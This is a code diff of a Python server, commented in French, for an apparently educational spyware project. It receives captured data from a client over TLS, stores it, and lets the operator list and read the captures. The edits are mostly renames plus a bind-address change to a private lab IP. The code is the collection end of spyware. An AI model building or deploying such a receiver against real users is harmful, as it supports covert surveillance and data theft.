@@ -5,11 +5,11 @@ import time
 import sys
 import os
 from pathlib import Path
-from threading import Thread
 import ssl
 import signal
 import psutil
 import setproctitle
+from threading import Thread
 
 # Arguments 
 
@@ -43,7 +43,6 @@ def handle_data(data, addr):
             file.write(data)
         os.rename(ficfilename,filename)
 
-    # print(f"Data received and saved in {filename}")
     print(f"Data received and saved")
 
 
@@ -62,30 +61,39 @@ def display_files():
 def read_file(filename):
     try:
         fic = list(path_captures.glob(f"*{filename}*"))
+
         if fic == []:
             print("File not found")
+
         elif len(fic) == 1 :
             with open (fic[0], "r") as file:
                 print(f"File content ({fic[0].name}) :")
                 content = file.read()
                 print(content)
+
         elif len(fic) > 5 :
             print("Too many files found ! \nPlease be more specific")
+
         else:
             print("Several files found :")
+
             for i in range(len(fic)):
                 print(f"{i} - {fic[i].name}")
+
             while True:
                 print("Which one do you want to read ?")
                 index = int(input("Enter the index of the file you want to read : "))
+
                 if 0 <= index < len(fic):
                     with open(fic[index], "r") as file:
                         print(f"File content ({fic[index].name}) :")
                         content = file.read()
                         print(content)
                     break
+
                 else:
                     print("Invalid index")
+                    
     except Exception as e:
         print(f"Error: {e}")
 
@@ -95,6 +103,7 @@ def read_file(filename):
 def get_server_instances():
     procs = []
 
+    # itération sur tous les processus
     for proc in psutil.process_iter():
         if "SpywareServer" == proc.name():
             procs.append(proc.pid)
@@ -119,30 +128,31 @@ def stop_server(signal=None, frame=None):
         time.sleep(1)
 
     ssl_socket.close()
-    server_socket.close()
+    socket_server.close()
 
     print(f"stoping server. host : {host}")
     
     exit()
 
 
-# Traitement
 
+# Traitement
 
 if args.listen:
 
     setproctitle.setproctitle("SpywareServer")
 
     signal.signal(signal.SIGTERM, stop_server)
+
     
     # Configuration du socket
-    host = '127.0.0.1'
+    host = '172.16.120.1'
     port = args.listen
 
-    # crétaion et configuration du socket
-    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    server_socket.bind((host, port))
-    server_socket.listen()
+    # création et configuration du socket
+    socket_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    socket_server.bind((host, port))
+    socket_server.listen()
 
     print(f"Server listening on {host}:{port}")
 
@@ -151,14 +161,14 @@ if args.listen:
 
 
     # récupération de la connexion
-    conn, addr = server_socket.accept()
+    conn, addr = socket_server.accept()
 
     # création du contexte ssl (avec le certificat et la clé privée)
-    context_ssl = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
-    context_ssl.load_cert_chain(certfile="./ssl2/certificate.pem", keyfile="./ssl2/private.pem")
+    context_connexion_ssl = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
+    context_connexion_ssl.load_cert_chain(certfile="./ssl2/certificate.pem", keyfile="./ssl2/private.pem")
     
     # utilisation du SSL pour lire les données entrantes
-    ssl_socket = context_ssl.wrap_socket(conn, server_side=True)
+    ssl_socket = context_connexion_ssl.wrap_socket(conn, server_side=True)
 
 
     while running:
@@ -211,7 +221,7 @@ if args.listen:
         
 
     ssl_socket.close()
-    server_socket.close()
+    socket_server.close()
 
 
 
